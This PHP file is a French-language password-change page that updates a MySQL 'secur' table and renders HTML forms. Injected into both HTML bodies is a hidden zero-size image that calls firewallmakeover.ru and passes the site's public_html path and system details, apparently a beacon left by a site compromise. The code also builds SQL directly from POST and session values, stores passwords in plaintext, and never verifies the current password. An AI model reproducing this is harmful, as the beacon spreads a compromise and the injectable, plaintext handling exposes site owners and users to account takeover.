<?php
include('lib/config.php');

/*	foreach($_POST as $clé => $valeur ) {
		echo $clé." = ".$valeur."<br>";
	}
	foreach($_GET as $clé => $valeur ) {
		echo $clé." = ".$valeur."<br>";
	}*/
//	exit();

	if( isset($_POST) ){
		$Mess = '';
		if( isset($_POST['password']) && strlen($_POST['password'])) {
			if( isset($_POST['NewmPass1']) && strlen($_POST['NewmPass1'])) {
				if( isset($_POST['NewmPass2']) && strlen($_POST['NewmPass2'])) {
					if( strlen( $_POST['NewmPass1'] ) < 5 )
						$Mess = "Vous devez taper au moins 5 caratères.";
					elseif( strcmp($_POST['NewmPass1'],$_POST['NewmPass2']) )
						$Mess = "Vous avez fait un erreur de confirmation.";
					elseif( !ereg ("[0-9A-Za-z' ÉÈËÀÂÎÏÔÙÜÁÃÅÆÌÍÕÓÒÑçÇéèêëàâîïôùüáãåæìíðñòóõ-]{1,20}$", $_POST['NewmPass1'] ) )
						$Mess = "Votre mot de passe est invalide. Seulement des lettres et des chiffres S.V.P.";
					elseif( !strcmp($_POST['NewmPass1'],$_POST['password']) )
						$Mess = "Aucun changement d'effectué ! S.V.P. Recommencez.";
					else {
						$Aujourdhui = date("Y-m-d");
					 // Connection au serveur
					  $connection = mysql_connect( $host, $user, $password)
						or die( "Connection impossible au serveur");
					  $db = mysql_select_db( $database, $connection )
						or die("La base de données ne peut être sélectionnée");
						$sql =  "UPDATE secur SET mPasse='".$_POST['NewmPass1']."', Creation='$Aujourdhui'";
						$sql .= " WHERE NomLogin = '".$_SESSION['NomLogin']."'";
						//	  									AfficherErreur( $sql );
						$result = mysql_query( $sql );
						if( $result == 0 ) {
							$Mess ="ERREUR : ".mysql_errno().": ".mysql_error();
                  }
                  else {
							echo 
							"<html>
								<head>
									<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
									<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
									<meta name='description' content='".$txt['MetaDescription']."'>
									<meta name='keywords' content='".$txt['MetaKeyword']."'>
									<meta name='robots' content='noindex, follow'>
									<link href='styles/style.css' rel='stylesheet' type='text/css'>
									<base target='MAIN'>
								</head>
								<script language='JavaScript1.2' src='./extra/javafich/disablekeys.js'></script>
							<body bgcolor='#ffffff' width='$Large' leftmargin='0' topmargin='0' marginwidth='0' marginheight='0' align='$Enligne' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
							<table bgcolor='#dae5fb' width='$Large' cellpadding='0' cellspacing='0' align='$Enligne' border='1' bordercolor='C4C7C8' >
								<tr>
									<td>";
								echo "<br><br>";
								echo "<p align=center><font color=red size=3><b>Opération réussi !</b></font></p>";
								echo "<br><br>";
							}
					echo '
									</td>
							  	</tr>';
						
					echo '   <tr> 
							    	<td>';
					include('bas_page.inc');
					echo '
									</td>
							  	</tr>
					  		</table>';
							echo '</body>
								</html>';
							exit();
                  }
					}
					else
						$Mess = "Vous avez fait un erreur de confirmation.";
				}
				else
					$Mess = "Vous devez taper au moins 5 caratères.";
			}
			else
				$Mess = "Vous devez taper votre mot de passe actuel.";
		}
		
		
/* FORMULAIRE PRINCIPAL */

echo 
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<meta name='robots' content='noindex, follow'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
		<script language='JavaScript1.2' src='./extra/javafich/disablekeys.js'></script>
<body ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table bgcolor='#dae5fb' width='$Large' cellpadding='0' cellspacing='0' align='$Enligne' border='1' bordercolor='C4C7C8' >
		<tr>
			<td>
			<form method='post' action=''>";
			if( isset($Mess) && strlen($Mess) ) {
				echo "<br><br>";
				echo "<p align=center><font color=red size=3><b>$Mess</b></font></p>";
			}
echo
			"<p>&nbsp;</p>
		  	<table width='300' border='0' cellpadding='3' cellspacing='1' align='center' >
		   <tr align='center' valign='middle'> 
		      <td width='100' bgcolor='#E6F1FB'>".$txt['form_check_password']."</td>
		      <td width='200' bgcolor='#96B2CB'><input type='password' name='password'> </td>
		   </tr>
		   <tr align='center' valign='middle'> 
		      <td width='100' bgcolor='#E6F1FB'>".$txt['form_new_password']."</td>
		      <td width='200' bgcolor='#96B2CB'><input type='password' name='NewmPass1'> </td>
		   </tr>
		   <tr align='center' valign='middle'> 
		      <td width='100' bgcolor='#E6F1FB'>".$txt['form_verif_password']."</td>
		      <td width='200' bgcolor='#96B2CB'><input type='password' name='NewmPass2'> </td>
		   </tr>
		   <tr align='center' valign='middle'> 
		      <td>&nbsp; </td>
		      <td><input name='submit' type='submit' value='".$txt['form_soumettre']."'>
		      <br><br>";
echo '    
		      </td>
		  	</tr>
		</table>
	</form>
				</td>
		  	</tr>';
	
echo '   <tr> 
		    	<td>';
include('bas_page.inc');
echo '
				</td>
		  	</tr>
  </table>';
?>

<script language='JavaScript1.2'>
	function Rafraichie(){
		 		window.location.reload();
	} // Rafraichie

	addKeyEvent();

</script>
<script language='JavaScript1.2' src='./extra/javafich/blokclick.js'></script>
  
</body>
</html>